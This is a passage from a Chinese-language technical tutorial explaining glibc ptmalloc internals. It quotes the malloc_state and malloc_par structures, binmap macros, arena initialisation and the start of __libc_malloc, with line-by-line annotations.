id="5-3-1-malloc-state"><a href="#5-3-1-malloc-state" class="headerlink" title="5.3.1 malloc_state"></a>5.3.1 malloc_state</h2><p>struct malloc_state定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> &#123;</span><br> <span class="hljs-comment">/* Serialize access. */</span><br> <span class="hljs-comment">//序列化访问</span><br> <span class="hljs-type">mutex_t</span> mutex;<br> <span class="hljs-comment">/* Flags (formerly in max_fast). */</span><br> <span class="hljs-type">int</span> flags;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> THREAD_STATS</span><br>   <span class="hljs-comment">/* Statistics for locking. Only used if THREAD_STATS is defined. */</span>  <br>     <span class="hljs-comment">//用于锁定的数据，仅在THREAD_STATS定义时被使用</span><br> <span class="hljs-type">long</span> stat_lock_direct, stat_lock_loop, stat_lock_wait;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br> <span class="hljs-comment">/* Fastbins */</span><br> mfastbinptr fastbinsY[NFASTBINS];<br> <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br> <span class="hljs-comment">//top chunk的基地址不会被存储在其他bin中</span><br> mchunkptr top;<br> <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>     <span class="hljs-comment">//最近的一次分割请求产生的剩余块</span><br> mchunkptr last_remainder;<br> <span class="hljs-comment">/* Normal bins packed as described above */</span><br>     <span class="hljs-comment">//按描述的方式打包正常的bin</span><br> mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br> <span class="hljs-comment">/* Bitmap of bins */</span><br>     <span class="hljs-comment">//bin的位图</span><br> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br> <span class="hljs-comment">/* Linked list */</span><br>     <span class="hljs-comment">//链表</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PER_THREAD</span><br> <span class="hljs-comment">/* Linked list for free arenas. */</span><br>     <span class="hljs-comment">//用于空闲区域（arena）的链表</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br> <span class="hljs-comment">/* Memory allocated from the system in this arena. */</span><br>     <span class="hljs-comment">//此区域中从系统分配的内存</span><br> INTERNAL_SIZE_T system_mem;<br> INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>Mutex（互斥锁）用于串行化访问分配区，当有多线程访问同一分配区时，第一个获得mutex的线程可以访问该分配区，分配完成后释放mutex供其他线程使用</li><li>Flags记录分配区的标志，bit0记录分配区是否至少有一个fast bin chunk，bit1用于记录分配区是否能返回连续的虚拟地址空间</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> FASTCHUNKS_BIT held in max_fast indicates that there are probably</span><br><span class="hljs-comment"> some fastbin chunks. It is set true on entering a chunk into any</span><br><span class="hljs-comment"> fastbin, and cleared only in malloc_consolidate.</span><br><span class="hljs-comment"> The truth value is inverted so that have_fastchunks will be true</span><br><span class="hljs-comment"> upon startup (since statics are zero-filled), simplifying</span><br><span class="hljs-comment"> initialization checks.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//FASTCHUNKS_BIT 存储在 max_fast 中，表示可能存在一些快速分配区（fastbin）的块。当一个块被放入任何一个快速分配区时，该标志会被设置为 true，并且仅在 malloc_consolidate 函数中被清除。</span><br><span class="hljs-comment">//该标志的真假值被反转，以便在启动时 have_fastchunks 为 true（因为静态变量会被初始化为零），从而简化初始化检查。</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FASTCHUNKS_BIT (1U)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> ATOMIC_FASTBINS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_fastchunks(M) catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_fastchunks(M) catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_fastchunks(M) ((M)-&gt;flags |= FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_fastchunks(M) ((M)-&gt;flags &amp;= ~FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> </span><br></code></pre></td></tr></table></figure><ul><li><p>上面的宏用于设置或置为flags中fast chunk的标志位bit0，0表示分配区有fast chunk，1表示没有</p></li><li><p>初始化完成的malloc_state中，flag值为0，表示该分配区有fast chunk，但<strong>实际上没有</strong>，试图从fast bins中分配chunk都会返回NULL</p></li><li><p>第一次调用malloc_consolidate()对fast bins进行chunk合并时，如果max_fast&gt;0，则调用clear_fastchunks，标志该分配区没有fast chunk（malloc_consolidate()会合并fast bins中所有chunk）</p></li><li><p>clear_fastchunks宏只在函数malloc_consolidate()中调用</p></li><li><p>当有fast chunk加入fast bins时，就调用set_fastchunks宏记录分配区的fast bins中存在fast chunk</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span><br><span class="hljs-comment"> regions. Otherwise, contiguity is exploited in merging together,</span><br><span class="hljs-comment"> when possible, results from consecutive MORECORE calls.</span><br><span class="hljs-comment"> The initial value comes from MORECORE_CONTIGUOUS, but is</span><br><span class="hljs-comment"> changed dynamically if mmap is ever used as an sbrk substitute.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//NONCONTIGUOUS_BIT 表示 MORECORE 不返回连续的内存区域。否则，会利用连续性，在可能的情况下，将连续的 MORECORE 调用的结果合并在一起。</span><br><span class="hljs-comment">//初始值来自 MORECORE_CONTIGUOUS，但如果 mmap 曾经被用作 sbrk 的替代品，这个值会被动态更改。</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NONCONTIGUOUS_BIT (2U)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span><br></code></pre></td></tr></table></figure><ul><li>Flags的bit1为0表示MORCORE返回<strong>连续</strong>虚拟地址空间，为1表示返回<strong>非连续</strong>虚拟空间</li><li>对于主分配区，MORCORE其实为sbr()，是连续</li><li>对于非主分配区，使用mmap()分配大块虚拟内存，然后切分来模拟主分配区，而通常mmap是非连续的，所以<strong>非主分配区默认分配非连续虚拟地址空间</strong></li><li>malloc_state中声明了几个对锁的统计变量，默认没定义THREAD_STATS（编译时的选项，当其被定义时，ptmalloc会收集与线程相关的内存分配和释放的统计信息，例如每个线程的分配内存大小，分配次数等。），所以不会对锁使用情况进行统计</li><li>fastbinY有10个元素（NFSTBINS）的数组，用于存放fast chunk链表头指针，所以fast bins最多包含10个fast chunk的单向链表</li><li>top是一个chunk的指针，指向分配区的top chunk</li><li>last_remainder是一个chunk指针，分配区上次分配small chunk时从一个chunk裂出一个chunk返回给用户，剩余部分形成一个chuhnk，被last_remaider指向</li><li>bins用来存储unsorted bin,small bins和large bins的chunk链表头，small bins62个，large bins63个，共125个，bin[1]为unsorted bins链表头，bin[0],bin[127]不存在，所以共126bins，Bins数组共有  254（NBINS*2 – 2）个 mchunkptr  指针，这里由于size,pre_size,fd_nextsize,bk_nextsize对存储无意义，所以在SIZE_SZ为8的平台上，只需要126*2*8&#x3D;2016个字节即可，bins数组大小为（128*2-2）*8&#x3D;2032大小，最后16个字节被浪费掉了</li><li>binmap字段是一个int数组，ptmalloc用一个bit表示该bit对应的bin中有无空闲chunk</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> Binmap</span><br><span class="hljs-comment"> To help compensate for the large number of bins, a one-level index</span><br><span class="hljs-comment"> structure is used for bin-by-bin searching. `binmap&#x27; is a</span><br><span class="hljs-comment"> bitvector recording whether bins are definitely empty so they can</span><br><span class="hljs-comment"> be skipped over during during traversals. The bits are NOT always</span><br><span class="hljs-comment"> cleared as soon as bins are empty, but instead only</span><br><span class="hljs-comment"> when they are noticed to be empty during traversal in malloc.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/* Conservatively use 32 bits per map word, even if on 64bit system */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Binmap（位图）</span><br><span class="hljs-comment">为了弥补 bin 数量较多的问题，这里使用了一种单级索引结构来进行逐个 bin 的搜索。binmap 是一个位向量，用于记录 bin 是否绝对为空，以便在遍历时跳过这些空的 bin。这些位并不是在 bin 变为空时立即清零，而是在 malloc 遍历时发现 bin 为空时才清除。*/</span><br><span class="hljs-comment">/* 保守地使用 32 位来表示每个映射单元，即使在 64 位系统上也是如此 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BINMAPSHIFT 5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BITSPERMAP (1U &lt;&lt; BINMAPSHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BINMAPSIZE (NBINS / BITSPERMAP)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> idx2block(i) ((i) &gt;&gt; BINMAPSHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT)-1))))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mark_bin(m,i) ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unmark_bin(m,i) ((m)-&gt;binmap[idx2block(i)] &amp;= ~(idx2bit(i)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_binmap(m,i) ((m)-&gt;binmap[idx2block(i)] &amp; idx2bit(i))</span><br></code></pre></td></tr></table></figure><ul><li>binmap一共28bit，16字节，4个int大小，binmap按int分成4个block，每个block有32bit，根据bin index可以用宏idx2block计算出该bin在binmap对应的bit属于哪个block</li><li>idx2bit宏取第i位为1，其他位都是0的掩码，比如idx2bit(3):0000 1000（低位向高位，从第0位开始）</li><li>mark_bin设置第i个bin在binmap中对应bit位为1，unmark_bin设置为0，get_binmap获取第i个bin对应的bit</li><li>next用于将分配区以单向链表链接起来</li><li>next_free将空闲分配区链接到单向链表中，仅当PER_THREAD定义时才定义该字段</li><li>system_mem字段记录当前分配区已分配内存大小</li><li>max_system_mem记录当前分配区最大能分配的内存大小</li></ul><h2 id="5-3-2-Malloc-par"><a href="#5-3-2-Malloc-par" class="headerlink" title="5.3.2 Malloc_par"></a>5.3.2 Malloc_par</h2><p>malloc_par定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> &#123;</span><br> <span class="hljs-comment">/* Tunable parameters */</span><br><span class="hljs-comment">/* 可调节参数 */</span><br> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trim_threshold;<br> INTERNAL_SIZE_T top_pad;<br> INTERNAL_SIZE_T mmap_threshold;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PER_THREAD</span><br> INTERNAL_SIZE_T arena_test;<br> INTERNAL_SIZE_T arena_max;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br> <span class="hljs-comment">/* Memory map support */</span><br>     <span class="hljs-comment">/* 内存映射支持 */</span><br> <span class="hljs-type">int</span> n_mmaps;<br> <span class="hljs-type">int</span> n_mmaps_max;<br> <span class="hljs-type">int</span> max_n_mmaps;<br> <span class="hljs-comment">/* the mmap_threshold is dynamic, until the user sets</span><br><span class="hljs-comment"> it manually, at which point we need to disable any</span><br><span class="hljs-comment"> dynamic behavior. */</span><br><span class="hljs-comment">/* mmap_threshold 是动态的，直到用户手动设置它为止。在用户手动设置后，我们需要禁用任何动态行为。*/</span><br> <span class="hljs-type">int</span> no_dyn_threshold;<br> <span class="hljs-comment">/* Cache malloc_getpagesize */</span><br>    <span class="hljs-comment">/* 缓存 malloc_getpagesize 的值 */</span><br> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> pagesize;<br> <span class="hljs-comment">/* Statistics */</span><br> <span class="hljs-comment">/*数据*/</span><br> INTERNAL_SIZE_T mmapped_mem;<br> INTERNAL_SIZE_T max_mmapped_mem;<br> INTERNAL_SIZE_T max_total_mem; <span class="hljs-comment">/* only kept for NO_THREADS */</span><span class="hljs-comment">/* 仅用于 NO_THREADS 情况 */</span><br> <span class="hljs-comment">/* First address handed out by MORECORE/sbrk. */</span><br>     <span class="hljs-comment">/* 通过 MORECORE/sbrk 分配的第一个地址。*/</span><br> <span class="hljs-type">char</span>* sbrk_base;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>trim_threshold字段表示收缩阈值，<strong>默认128KB</strong>，当每个分配区top chunk大于该阈值时，会被free掉</li><li>由于mmap分配阈值的动态调整，在free时可能将收缩阈值修改为mmap的分配阈值的2倍<ul><li>64位下，mmap分配阈值32MB，所以收缩阈值64MB</li><li>32位下，mmap分配阈值512B，所以收缩阈值1MB</li></ul></li><li>收缩阈值可通过mllocpt()设置</li><li>top_pad表示分配时是否有添加额外的pad（额外添加的内存），默认是0。（ 在 glibc 的 ptmalloc 内存分配器中，<code>top_pad</code> 字段用于控制在初始化或扩展堆时，分配器会额外申请的内存大小。这个字段的默认值为 0，表示在分配内存时不会额外添加填充 ）</li><li>mmap_threshold表示mmap分配阈值，默认128KB。32位最大512KB，64位下最大32MB，由于默认开启mmap分配阈值动态调整，该字段会被动态调整，但不会超过最大值</li><li>area_test,arena_max用于PER_THREAD优化，32位下arena_test默认为2，64位：8<ul><li>当创建分配区数量达到arena_test时，系统会根据当前配置计算分配区最大数量，并将其设置为一个固定值</li><li>arena_max默认是0，表示分配区最大数量由arena_test决定，当系统中分配区数量达到arena_max时就不会创建新分配区而是通过重用已有的分配区</li><li>这两个值都可以通过mallopt()调整</li></ul></li><li>n_mmaps字段表示当前进程使用mmap()分配的内存块数量</li><li>n_mmaps_max表示<strong>进程</strong>使用mmap()分配内存块的最大数量，默认65536，可以使用mallopt()修改</li><li>max_n_mmaps表示<strong>当前进程</strong>使用mmap分配的内存块最大数量，以确保不会超过n_mmap_max， <code>max_n_mmaps</code> 的值通常由 <code>n_mmaps_max</code> 决定，用户通过调整 <code>n_mmaps_max</code> 来间接影响 <code>max_n_mmap</code> ，该字段是由于mstats()函数输出统计需要该字段</li><li>no_dyn_threshold表示是否开启mmap分配阈值的动态调整，默认值0，表示开启</li><li>pagsize表示系统的页大小，默认4KB</li><li>mmapped_mem和max_nmmapped_mem都用于统计mmap分配的内存大小，一般情况二者相等，max_mmapped_mem用于mstats()函数<ul><li>max_total_mem字段在<strong>单线程</strong>情况下用于统计进程分配的内存总数</li></ul></li><li>sbrk_base字段表示堆的起始地址</li></ul><h2 id="5-3-3分配区的初始化"><a href="#5-3-3分配区的初始化" class="headerlink" title="5.3.3分配区的初始化"></a>5.3.3分配区的初始化</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span><br><span class="hljs-comment"> malloc. If you are adapting this malloc in a way that does NOT use</span><br><span class="hljs-comment"> a static or mmapped malloc_state, you MUST explicitly zero-fill it</span><br><span class="hljs-comment"> before using. This malloc relies on the property that malloc_state</span><br><span class="hljs-comment"> is initialized to all zeroes (as is true of C statics). */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">在这个内存分配器中，存在多个这种结构体（“分配区”）。如果你正在以一种不使用静态分配或通过 mmap 映射的 malloc_state 的方式调整这个内存分配器，你必须在使用之前显式地将其清零。这个内存分配器依赖于 malloc_state 被初始化为全零的特性（这与 C 语言中静态变量的初始化行为一致）。</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span>;</span><br><span class="hljs-comment">/* There is only one instance of the malloc parameters. */</span><br><span class="hljs-comment">/* 只有一个实例的内存分配参数。*/</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> <span class="hljs-title">mp_</span>;</span><br><span class="hljs-comment">/* Maximum size of memory handled in fastbins. */</span><br><span class="hljs-comment">/* fastbins 中处理的内存块的最大大小。*/</span><br><span class="hljs-type">static</span> INTERNAL_SIZE_T global_max_fast;<br></code></pre></td></tr></table></figure><ul><li>main_arena：主分配区，任何进程有且仅有一个主分配区</li><li>mp_：全局唯一malloc_par实例，用于参数管理和统计信息，比如<ul><li><code>mp_</code> 包含了内存分配器的各种可调节参数，例如 <code>mmap_threshold</code>（使用 <code>mmap</code> 分配的阈值）、<code>trim_threshold</code>（堆收缩的阈值）等。</li><li>它还记录了一些统计信息，例如当前的内存使用情况、分配的内存块数量等。</li></ul></li><li>global_max_fast全局变量表示fast bins中最大chunk的大小</li></ul><p>main_arena初始化函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> Initialize a malloc_state struct.</span><br><span class="hljs-comment"> This is called only from within malloc_consolidate, which needs</span><br><span class="hljs-comment"> be called in the same contexts anyway. It is never called directly</span><br><span class="hljs-comment"> outside of malloc_consolidate because some optimizing compilers try</span><br><span class="hljs-comment"> to inline it at all call points, which turns out not to be an</span><br><span class="hljs-comment"> optimization at all. (Inlining it in malloc_consolidate is fine though.)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> __STD_C</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_init_state</span><span class="hljs-params">(mstate av)</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_init_state</span><span class="hljs-params">(av)</span> mstate av;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#123;<br> <span class="hljs-type">int</span> i;<br> mbinptr bin;<br> <span class="hljs-comment">/* Establish circular links for normal bins */</span><br> <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; NBINS; ++i) &#123;<br> bin = bin_at(av,i);<br> bin-&gt;fd = bin-&gt;bk = bin;<br> &#125;<br><span class="hljs-comment">//设置非主分配区</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> MORECORE_CONTIGUOUS</span><br> <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br> set_noncontiguous(av);<br><span class="hljs-comment">//初始化主分配区</span><br> <span class="hljs-keyword">if</span> (av == &amp;main_arena)<br> set_max_fast(DEFAULT_MXFAST);<br><span class="hljs-comment">//设置标志位</span><br> av-&gt;flags |= FASTCHUNKS_BIT;<br><span class="hljs-comment">//初始化top chunk</span><br> av-&gt;top = initial_top(av);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>分配区初始化函数默认分配区的实例av是全局静态变量或已经将av所有字段清0</li><li>初始化：遍历所有bins，将每个bin中空闲链表置空，就是将bin的fd，bk都指向bin本身</li><li>由于默认av为0，即默认分配连续虚拟地址空间，但只有<strong>主分配区才可以分配连续的</strong>，所以对于非主分配区，需要设置其为分配非连续虚拟地址空间</li><li>若初始化主分配区，则需要设置global_max_fast，由于主分配区最先被初始化，这保证global_max_fast只被初始化一次。由此，如果global_max_fast值非0，那么意味着主分配区已经被初始化</li><li>最后初始化top chunk</li></ul><p>Ptmalloc参数初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Set up basic state so that _int_malloc et al can work. */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">ptmalloc_init_minimal</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> DEFAULT_TOP_PAD != 0</span><br> mp_.top_pad = DEFAULT_TOP_PAD;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//mmap参数设置</span><br> mp_.n_mmaps_max = DEFAULT_MMAP_MAX;<br> mp_.mmap_threshold = DEFAULT_MMAP_THRESHOLD;<br><span class="hljs-comment">//内存收缩阈值设置</span><br> mp_.trim_threshold = DEFAULT_TRIM_THRESHOLD;<br><span class="hljs-comment">//页</span><br> mp_.pagesize = malloc_getpagesize;<br><span class="hljs-comment">//线程本地分配区数量      </span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PER_THREAD</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8))</span><br> mp_.arena_test = NARENAS_FROM_NCORES (<span class="hljs-number">1</span>);<br> narenas = <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>主要将全局变量mp_字段初始化为默认值</li><li>若定义编译选项PER_THREAD，会根据cpu核心数计算分配区数量<ul><li>32位每个核心2分配区</li><li>64位每个核心8分配区</li></ul></li></ul><h1 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc-2.23"></a>glibc-2.23</h1><h2 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="_libc_malloc"></a>_libc_malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr; <span class="hljs-comment">//表示分配区(arena)状态</span><br>  <span class="hljs-type">void</span> *victim; <span class="hljs-comment">//表示分配的内存块，最终返回给调用者</span><br><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<span class="hljs-comment">//_malloc_hook是一个全局钩子函数指针，允许用于在malloc时插入自己的逻辑</span><br><span class="hljs-comment">//atomic_forced_read：确保_malloc_hook的读取是原子操作，防止多线程导致的错误</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<span class="hljs-comment">//RETURN_ADDRESS(0)获取当前函数的返回地址，用于调试和追踪</span><br><br>  arena_get (ar_ptr, bytes); <span class="hljs-comment">//获取分配区</span><br><br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br><span class="hljs-comment">//如果第一次分配失败，并分配区不为空，则尝试从另一分配区重新分配</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<span class="hljs-comment">//尝试另一个可用分配区</span><br>      victim = _int_malloc (ar_ptr, bytes);<span class="hljs-comment">//再次调用分配的函数</span><br>    &#125;<br><br><span 